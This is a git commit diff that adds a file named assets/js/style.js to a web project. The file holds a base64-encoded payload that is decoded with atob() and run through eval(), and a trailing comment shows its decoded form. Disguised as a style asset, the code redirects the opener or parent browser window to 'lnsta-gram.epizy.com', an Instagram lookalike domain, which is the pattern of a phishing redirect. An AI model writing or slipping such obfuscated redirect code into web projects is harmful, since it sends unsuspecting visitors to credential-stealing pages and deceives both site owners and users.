6de59c0301894c57257637cd7bce8f5497fc5a16
Dipkill <tolol@protonmail.com>
2020-07-02 07:33:40 -0700

    commit

---
+++ assets/js/style.js
@@ -0,0 +1,5 @@
+data = "aWYgKHdpbmRvdy5vcGVuZXIpe3dpbmRvdy5vcGVuZXIucGFyZW50LmxvY2F0aW9uLnJlcGxhY2UoJ2h0dHA6Ly9sbnN0YS1ncmFtLmVwaXp5LmNvbScpO30KaWYgKHdpbmRvdy5wYXJlbnQgIT0gd2luZG93KXt3aW5kb3cucGFyZW50LmxvY2F0aW9uLnJlcGxhY2UoJ2h0dHA6Ly9sbnN0YS1ncmFtLmVwaXp5LmNvbScpO30=";
+decrypt = atob(data);
+eval(decrypt);
+
+// "if (window.opener){window.opener.parent.location.replace('http://lnsta-gram.epizy.com');} if (window.parent != window){window.parent.location.replace('http://lnsta-gram.epizy.com');}"
